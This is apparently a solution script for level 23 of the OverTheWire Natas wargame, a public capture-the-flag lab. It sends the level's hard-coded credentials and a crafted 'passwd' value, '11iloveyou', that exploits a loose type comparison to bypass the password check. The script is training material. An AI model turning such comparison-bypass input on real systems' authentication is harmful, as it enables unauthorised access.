import requests

url = "http://natas23.natas.labs.overthewire.org/"
auth = ("natas23","CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5")

r = requests.get(url=url,auth=auth,params={"passwd": "11iloveyou"})
print(r.text)